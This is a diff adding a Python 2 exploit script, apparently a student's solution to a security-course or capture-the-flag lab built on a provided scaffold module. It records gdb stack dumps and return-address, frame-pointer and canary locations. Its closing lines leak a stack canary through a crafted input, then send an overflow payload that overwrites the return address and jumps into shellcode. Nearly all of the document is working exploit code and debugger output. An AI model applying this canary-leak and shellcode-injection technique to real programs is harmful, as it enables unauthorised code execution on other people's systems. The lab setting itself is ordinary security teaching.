@@ -1,0 +1,45 @@
+#!/usr/bin/env python2
+
+import scaffold as p
+from scaffold import SHELLCODE
+
+### YOUR CODE STARTS HERE ###
+
+# Program start:
+p.start()
+# Example send:
+#p.send('test\\x41\n')
+
+# Example receive:
+#assert p.recv(6) == 'testA\n'
+
+### YOUR CODE ENDS HERE ###
+'''
+RIP dexeify  	 address = 0xffffd81c		Val = 0x8049341
+SFP dehexify 	 address = 0xffffd818		
+Canary			
+
+c.buffer 	 address = 0xffffd7fc
+
+
+before executing gets
+(gdb) x/16wx c.buffer
+0xffffd7fc:     0x00000000      0x00000000      0xffffdfe1      0x0804cfe8
+0xffffd80c:     0xf9d90f89      0x0804d020      0x00000000      0xffffd828
+0xffffd81c:     0x08049341      0x00000000      0xffffd840      0xffffd8bc
+0xffffd82c:     0x0804952a      0x00000001      0x08049329      0x0804cfe8
+
+after executing gets
+0xffffd7fc:     0x42424242      0x42424242      0x42424242      0x42424242
+0xffffd80c:     0xf9d90f00      0x0804d020      0x00000000      0xffffd828
+0xffffd81c:     0x08049341      0x00000000      0xffffd840      0xffffd8bc
+0xffffd82c:     0x0804952a      0x00000001      0x08049329      0x0804cfe8
+
+'''
+rip = '\x20\xd8\xff\xff'
+p.send('\\x42'*3  + '\\x' + '\n')
+r = p.recvline()
+canary = r[4:8]
+p.send( 'B' * 15 + '\0' + canary + 'B' * 12 + rip + SHELLCODE + '\n') 
+
+
